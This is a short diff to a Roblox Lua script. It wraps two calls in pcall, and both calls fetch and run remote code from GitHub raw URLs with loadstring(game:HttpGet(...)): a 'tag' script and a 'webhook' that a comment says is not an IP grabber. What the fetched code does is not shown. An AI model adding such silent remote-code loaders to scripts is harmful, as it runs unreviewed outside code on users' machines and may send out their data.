@@ -5,9 +5,13 @@ local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 
 -- tag
+pcall(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/DevTools/main/Tag"))()
+end)
 -- this webhook isnt a IP grabber u can check
+pcall(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Something478/Scripts/refs/heads/main/Webhooks/1.luau"))()
+end)
 
 -- Functions
 local Wait = task.wait
